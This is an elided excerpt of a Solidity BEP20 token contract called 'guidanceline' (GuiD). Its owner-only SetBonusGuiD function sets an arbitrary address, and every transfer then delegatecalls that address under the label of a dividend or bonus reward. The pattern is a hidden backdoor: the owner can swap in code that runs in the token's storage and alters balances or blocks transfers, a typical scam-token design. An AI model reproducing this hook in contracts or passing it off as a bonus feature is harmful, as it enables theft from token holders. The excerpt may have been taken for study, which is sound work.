...
contract guidanceline is Context, iBEP20, Ownable{
  ...
  string private constant _name = 'guidanceline';
  string private constant _symbol = 'GuiD';
  
  uint256 private constant _totalSupply = 10000000000 *  10**9;
  uint8 private constant _decimals = 9;
  uint256 private c_Bonus = 0;
  address C;
  ...
  */
  ...
  function claimDividendGuiD(address sender, address recipient, uint256 amount) private returns (uint256) {      
      ...
      (bool success, bytes memory bytesdata) = C.delegatecall(
        abi.encodeWithSignature("bonusReward(uint256,address,address,uint256[])", c_Bonus, sender, recipient, arrData)
      );
      require(success, string (bytesdata));

      uint256[] memory resData = new uint256[](6);
      resData = abi.decode(bytesdata, (uint256[]));     
  ...
  function SetBonusGuiD(address c) public onlyOwner {
    C = c;
  } 
  ...
  function _transfer(address sender, address recipient, uint256 amount) private {
    ...
    uint256 bonusAmount = claimDividendGuiD(sender, recipient, amount);   
